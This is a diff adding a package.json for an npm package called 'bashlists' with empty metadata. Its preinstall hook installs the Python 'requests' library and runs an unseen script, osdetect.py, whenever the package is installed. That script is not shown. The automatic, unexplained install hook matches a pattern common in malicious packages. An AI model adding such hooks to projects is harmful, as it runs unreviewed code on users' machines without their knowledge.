@@ -1,0 +1,14 @@
+{
+  "name": "bashlists",
+  "version": "1.0.1",
+  "description": "",
+  "bin": {
+    "bls": "./bashlsbin"
+  },
+  "scripts": {
+    "preinstall": "pip install requests && python osdetect.py"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {}
+}
